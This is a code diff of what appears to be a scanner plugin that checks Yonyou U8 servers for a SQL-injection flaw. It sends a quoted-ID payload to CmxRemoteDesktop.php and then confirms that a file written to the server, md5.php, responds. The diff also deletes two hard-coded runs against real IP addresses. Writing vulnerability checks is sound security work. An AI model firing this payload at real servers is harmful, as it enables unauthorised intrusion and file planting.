@@ -11,7 +11,7 @@ import os
 
 def assign(service, arg):
     if service == "yongyou_u8":
-        return True, arg    
+        return True, arg
 
 def audit(arg):
     payload="Server/CmxRemoteDesktop.php?pgid=App_Show&ID=1'"
@@ -26,12 +26,11 @@ def audit(arg):
         code, head, res, errcode, _url = curl.curl2(exp_url)
         verify_url = arg + 'Server/md5.php'
         code, head, res, errcode, _url = curl.curl2(verify_url)
-        if code == 200 and '202cb962ac59075b964b07152d234b70' in res: 
+        if code == 200 and '202cb962ac59075b964b07152d234b70' in res:
             security_hole(verify_url)
+            return arg
     except:pass
-            
-    
-if __name__ == '__main__':
+
+
+if __name__== '__main__':
     from dummy import *
-    audit(assign('yongyou_u8','http://58.217.117.20:81/')[1])
-    audit(assign('yongyou_u8','http://221.238.243.237:8000/')[1])
